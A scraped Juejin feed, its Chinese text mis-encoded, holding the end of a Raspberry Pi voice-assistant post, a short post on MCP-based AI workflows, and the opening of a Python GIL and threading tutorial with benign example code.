ğŸ¤– Jarvis: å½“ç„¶äº†ï¼Œè¿™æ˜¯ä¸ªç»å…¸çš„ç¬‘è¯ã€‚ä¸ºä»€ä¹ˆæµ·æ´‹é‡Œçš„é±¼æ€»æ˜¯å–œæ¬¢èšåœ¨ä¸€èµ·ï¼Ÿå› ä¸ºå®ƒä»¬è§‰å¾—â€˜æ¸¸â€™åœ¨ä¸€èµ·æ›´æœ‰è¶£ï¼

ğŸ‘‚ å¬åˆ°: ä»Šå¤©å¤©æ°”å¦‚ä½•

âš ï¸ æ£€æµ‹åˆ° AI æœªè¯†åˆ«è®¾å¤‡ï¼Œå¯åŠ¨è§„åˆ™å…œåº•æ£€æŸ¥...

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': None, <span class="hljs-string">'action'</span>: None, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'å¯¹ä¸èµ·ï¼Œæˆ‘ç›®å‰æ— æ³•è·å–å®æ—¶å¤©æ°”ä¿¡æ¯ã€‚'</span>}

ğŸ¤– Jarvis: å¯¹ä¸èµ·ï¼Œæˆ‘ç›®å‰æ— æ³•è·å–å®æ—¶å¤©æ°”ä¿¡æ¯ã€‚
</code></pre>
<h2 data-id="heading-9">ğŸ”® ä¸‹ä¸€æ­¥è®¡åˆ’</h2>
<p>è€³æœµå’Œå˜´å·´éƒ½æœ‰äº†ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯**â€œçœ¼ç›â€ <strong>ï¼ æ˜å¤©æ‰“ç®—æŠ˜è…¾ Hailo-8L NPUï¼Œé…åˆæ ‘è“æ´¾ 5 çš„ PCIe æ¥å£ï¼Œè·‘ä¸€ä¸‹ YOLOv8ã€‚ ç›®æ ‡ï¼šå®ç°</strong>â€œäººæ¥ç¯äº®â€**çš„è§†è§‰ä¸»åŠ¨æ™ºèƒ½ï¼Œæ•¬è¯·æœŸå¾…ï¼</p>
<hr/>
<blockquote>
<p><strong>ä½œè€…åè®°</strong>ï¼š æåµŒå…¥å¼ AI çœŸçš„ç—›å¹¶å¿«ä¹ç€ã€‚è™½ç„¶ä¸ºäº†ä¸€ä¸ªå£°å¡é©±åŠ¨èƒ½æŠ˜è…¾ä¸€æ™šä¸Šï¼Œä½†å½“ç¯äº®èµ·çš„é‚£ä¸€åˆ»ï¼Œæ„Ÿè§‰è‡ªå·±å°±æ˜¯é’¢é“ä¾ ï¼ å¦‚æœä½ ä¹Ÿå¯¹æ ‘è“æ´¾ AIoT æ„Ÿå…´è¶£ï¼Œæ¬¢è¿è¯„è®ºåŒºäº¤æµ~ ğŸ‘‹</p>
</blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F1115117860lxx-lang%2FPi-AIoT-Central" target="_blank" title="https://github.com/1115117860lxx-lang/Pi-AIoT-Central" ref="nofollow noopener noreferrer">ä»£ç è¯¦æƒ…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI æ—¶ä»£çš„å‰ç«¯ç©¶ç«Ÿè¿˜èƒ½ç§¯ç´¯ä»€ä¹ˆ]]></title>    <link>https://juejin.cn/post/7580674010838941742</link>    <guid>https://juejin.cn/post/7580674010838941742</guid>    <pubDate>2025-12-08T03:51:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580674010838941742" data-draft-id="7580971667036749850" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI æ—¶ä»£çš„å‰ç«¯ç©¶ç«Ÿè¿˜èƒ½ç§¯ç´¯ä»€ä¹ˆ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-08T03:51:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ½œæ°´è±†"/> <meta itemprop="url" content="https://juejin.cn/user/1996368848879678"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI æ—¶ä»£çš„å‰ç«¯ç©¶ç«Ÿè¿˜èƒ½ç§¯ç´¯ä»€ä¹ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1996368848879678/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ½œæ°´è±†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:51:14.000Z" title="Mon Dec 08 2025 03:51:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">AI æ—¶ä»£çš„å‰ç«¯ç©¶ç«Ÿè¿˜èƒ½ç§¯ç´¯ä»€ä¹ˆ</h2>
<p>å½“ç„¶æ˜¯ç§¯ç´¯çš„å¯¹AIçš„çº¦æŸç»éªŒå’Œå…·ä½“é¡¹ç›®ä¸­æç‚¼çš„å·¥ä½œæµäº†ï¼Œä¸è¿‡æˆ‘æš‚æ—¶å°†ä»–ä»¬æè¿°æˆæˆä¸“å®¶å’Œå·¥ä½œæµï¼Œå…¶å®aiææ•ˆç”¨çš„åŸºæœ¬éƒ½æ˜¯è¿™ä¸ªæ€è·¯ã€‚å¥½å¤šå“¥ä»¬éƒ½éšéšå¯Ÿè§‰åˆ°è¿™è‚¡æœºç¼˜ï¼Œåªæ˜¯è¿Ÿè¿Ÿæ— æ³•å½»åº•å‚æ‚Ÿè¸ä¸Šä¿®ä»™ä¹‹è·¯ï¼Œä¸Šå‘¨æœºç¼˜å·§åˆä¹‹ä¸‹ï¼Œå‚ä¸äº†ä¸€æ¡è·¯ï¼Œç‰¹æ¥ç•™ä¸‹ä¸€æœ¬ç„šè¯€ï¼ŒğŸ¶</p>
<h3 data-id="heading-1">ä¿®ä»™æœ€é‡è¦çš„æ˜¯ç†æ¸…å¥‡ç»å…«è„‰ï¼Œè´¯é€šä¸€æ°”ï¼Œaiä¿®ä»™ä¹Ÿä¸€æ ·</h3>
<p>è¿™é‡Œæœ‰å…³é”®çš„ä¸¤æ­¥éª¤ï¼Œä¸€ä¸ªæ˜¯æ„å»ºmcpçš„æµç¨‹ï¼Œä¸€ä¸ªæ˜¯è·¨é¡¹ç›®çš„è®°å¿†mcp</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/831f68c187d24af7a2acd7a0f9b199e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c5rC06LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770673&amp;x-signature=%2BhfZgYGQNCj3EP94js2KskS2Zn4%3D" alt="image.png" loading="lazy"/></p>
<p>æ„å»ºä¸€ä¸ªå¯ä»¥è·¨é¡¹ç›®çš„ï¼Œæ ¹æ®æ¯æ¬¡ä¼šè¯è®°å½•ç‹¬ç«‹å­˜å‚¨åœ¨æœ¬åœ°çš„çš„è®°å¿†ç±»å‹çš„mcp,å…·ä½“çš„æ„å»ºï¼Œä½ ä¹Ÿå¯ä»¥è®©Aiå¸®ä½ å®Œæˆ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0682b60c7184b20a5f6b43db2ea6ece~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c5rC06LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770673&amp;x-signature=TRT1QZvHVZazwOds5SBrkFkMUk8%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">ç¬¬äºŒéƒ¨å°±æ˜¯æ‰“é€ ä¸€å †ç§°æ‰‹çš„æ³•å®</h3>
<p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“ç°åœ¨çš„ç¼–è¾‘å™¨æ˜¯ä¸èƒ½ç›´æ¥è¯»å–word ä¹‹ç±»çš„æ–‡æœ¬çš„ï¼Œä½†æ˜¯èƒ½éƒ½è¯»å–md,åŒç†åˆ›å»ºä¹‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a953120e2ed4f8ea7f2536261d75bd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c5rC06LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770673&amp;x-signature=RndNLvzxYbiLDQiGMBuMv6avO8Q%3D" alt="image.png" loading="lazy"/></p>
<p>ç„¶åå°±æ˜¯ä¸æ–­æ²‰æ·€ä¸‹æ¥çš„ä¸“å®¶äº†</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3974cb14e0074c37a3d0bd83fa55c3d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c5rC06LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770673&amp;x-signature=bbfN%2BUgw3eL0wNjsrw%2FvQ9NzNpM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">æœ€å</h3>
<p>ä¿®è¡Œä¹‹è·¯ï¼Œæ¥æ—¥ç›¸è§</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆå¤§å‚éƒ½åœ¨å‡çº§Python 3.12ï¼Ÿçœ‹å®Œæˆ‘è¿å¤œé‡æ„äº†ä»£ç ]]></title>    <link>https://juejin.cn/post/7580683234437005375</link>    <guid>https://juejin.cn/post/7580683234437005375</guid>    <pubDate>2025-12-08T05:45:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580683234437005375" data-draft-id="7580616979473727494" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆå¤§å‚éƒ½åœ¨å‡çº§Python 3.12ï¼Ÿçœ‹å®Œæˆ‘è¿å¤œé‡æ„äº†ä»£ç "/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T05:45:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·6854537597769"/> <meta itemprop="url" content="https://juejin.cn/user/1601315325621550"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆå¤§å‚éƒ½åœ¨å‡çº§Python 3.12ï¼Ÿçœ‹å®Œæˆ‘è¿å¤œé‡æ„äº†ä»£ç 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1601315325621550/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·6854537597769
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T05:45:00.000Z" title="Mon Dec 08 2025 05:45:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸Šå‘¨ï¼Œæˆ‘ä»¬ç»„çš„ä»£ç reviewä¼šä¸Šï¼Œå°ç‹å†™äº†ä¸€è¡Œçœ‹ä¼¼æ™®é€šçš„ä»£ç ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">url</span>):
    time.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># æ¨¡æ‹Ÿä¸‹è½½</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"ä¸‹è½½å®Œæˆ: <span class="hljs-subst">{url}</span>"</span>

<span class="hljs-comment"># æ¨¡æ‹Ÿä¸‹è½½10ä¸ªæ–‡ä»¶</span>
start_time = time.time()
threads = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
    thread = threading.Thread(target=download_file, args=(<span class="hljs-string">f"http://example.com/file<span class="hljs-subst">{i}</span>.jpg"</span>,))
    threads.append(thread)
    thread.start()

<span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:
    thread.join()

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"è€—æ—¶: <span class="hljs-subst">{time.time() - start_time}</span>ç§’"</span>)
</code></pre>
<p>è€å¤§çœ‹äº†ä¸‰ç§’ï¼Œè¯´äº†å¥ï¼š"ä½ çŸ¥é“è¿™è¡Œä»£ç åœ¨ç”Ÿäº§ç¯å¢ƒä¼šå‡ºä»€ä¹ˆé—®é¢˜å—ï¼Ÿ"</p>
<p>å°ç‹æ„£ä½äº†ã€‚æˆ‘ä¹Ÿæ„£ä½äº†ã€‚</p>
<p>"åŒæ ·æ˜¯10ä¸ªå¹¶å‘ä»»åŠ¡ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬ç”¨å¤šçº¿ç¨‹æ¯”éš”å£ç»„çš„Javaæ…¢äº†3å€ï¼Ÿè€å¤§ç»§ç»­è¿½é—®ã€‚"</p>
<p>ä¼šè®®å®¤é‡Œä¸€ç‰‡æ­»å¯‚ã€‚</p>
<p>é‚£ä¸€åˆ»æˆ‘æ„è¯†åˆ°ï¼Œæˆ‘ä»¬å¯¹Pythonå¹¶å‘çš„ç†è§£ï¼Œå¯èƒ½è¿˜åœç•™åœ¨ä¸‰å¹´å‰ã€‚</p>
<h2 data-id="heading-0">ä½ ä»¥ä¸ºçš„Pythonå¹¶å‘ vs å®é™…ä¸Šçš„Pythonå¹¶å‘</h2>
<p>å…ˆåšä¸ªå°æµ‹è¯•ï¼Œä½ è§‰å¾—ä¸‹é¢è¿™æ®µä»£ç ä¼šè¾“å‡ºä»€ä¹ˆï¼Ÿ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

counter = <span class="hljs-number">0</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">increment</span>():
    <span class="hljs-keyword">global</span> counter
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>):
        counter += <span class="hljs-number">1</span>

threads = []
<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):
    t = threading.Thread(target=increment)
    threads.append(t)
    t.start()

<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:
    t.join()

<span class="hljs-built_in">print</span>(counter)  <span class="hljs-comment"># ä½ çŒœæ˜¯å‡ ï¼Ÿ</span>
</code></pre>
<p>å¦‚æœä½ è„±å£è€Œå‡º"200000"ï¼Œé‚£æ­å–œä½ ï¼Œå’Œ95%çš„ç¨‹åºå‘˜ä¸€æ ·ï¼Œéƒ½æ‰è¿›äº†åŒä¸€ä¸ªå‘é‡Œã€‚</p>
<p><strong>å®é™…è¾“å‡ºå¯èƒ½æ˜¯ï¼š137894ã€152677ã€æˆ–è€…å…¶ä»–ä»»ä½•å°äº200000çš„æ•°å­—ã€‚</strong></p>
<p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿè¿™å°±è¦æåˆ°Pythonå¹¶å‘ç¼–ç¨‹çš„ç¬¬ä¸€ä¸ªå¤§å‘ï¼š<strong>GILï¼ˆå…¨å±€è§£é‡Šå™¨é”ï¼‰</strong>ã€‚</p>
<h3 data-id="heading-1">GILï¼šPythonå¹¶å‘çš„"å¹½çµé”"</h3>
<p>æƒ³è±¡ä¸€ä¸‹ä½ åœ¨æ˜Ÿå·´å…‹æ’é˜Ÿä¹°å’–å•¡ï¼š</p>
<p><strong>å•çº¿ç¨‹æ¨¡å¼</strong>ï¼šåº—é‡Œåªæœ‰ä¸€ä¸ªå’–å•¡å¸ˆï¼Œé¡¾å®¢æ’æˆä¸€é˜Ÿï¼Œä¸€äººä¸€æ¯ï¼ŒæŒ‰é¡ºåºæ¥ã€‚</p>
<p><strong>ç†æƒ³çš„å¤šçº¿ç¨‹æ¨¡å¼</strong>ï¼šåº—é‡Œæœ‰å¤šä¸ªå’–å•¡å¸ˆï¼Œå¯ä»¥åŒæ—¶ç»™å¤šä¸ªé¡¾å®¢åšå’–å•¡ã€‚</p>
<p><strong>Pythonçš„å¤šçº¿ç¨‹æ¨¡å¼</strong>ï¼šåº—é‡Œæœ‰å¤šä¸ªå’–å•¡å¸ˆï¼Œä½†æ˜¯åªæœ‰ä¸€æŠŠå’–å•¡æœºã€‚å¤§å®¶è½®æµä½¿ç”¨å’–å•¡æœºï¼Œè™½ç„¶çœ‹èµ·æ¥å¾ˆå¿™ï¼Œä½†åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªäººåœ¨åšå’–å•¡ã€‚</p>
<p>è¿™å°±æ˜¯GILçš„æœ¬è´¨ï¼š<strong>åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æ‰§è¡ŒPythonå­—èŠ‚ç </strong>ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># çœ‹çœ‹è¿™ä¸ªä¾‹å­</span>
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cpu_bound</span>():
    count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50_000_000</span>):
        count += i * i
    <span class="hljs-keyword">return</span> count

<span class="hljs-keyword">def</span> <span class="hljs-title function_">io_bound</span>():
    time.sleep(<span class="hljs-number">2</span>)
